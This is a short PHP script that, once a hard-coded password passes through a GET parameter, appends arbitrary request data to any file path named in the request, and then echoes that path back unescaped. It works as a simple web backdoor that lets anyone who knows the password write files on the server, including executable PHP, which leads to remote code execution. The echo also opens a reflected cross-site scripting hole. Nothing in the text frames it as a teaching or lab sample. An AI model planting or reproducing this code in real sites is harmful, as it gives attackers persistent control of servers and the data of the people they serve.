<?php
$password = $_GET["pass"];
if ($password == 12345678910){
$file = $_GET["file"];
$fileopen = fopen($file, 'a') or die("can't open file");
$data = $_GET["data"];
fwrite($fileopen, $data);
fclose($fileopen);
}
echo $_GET["file"];
?>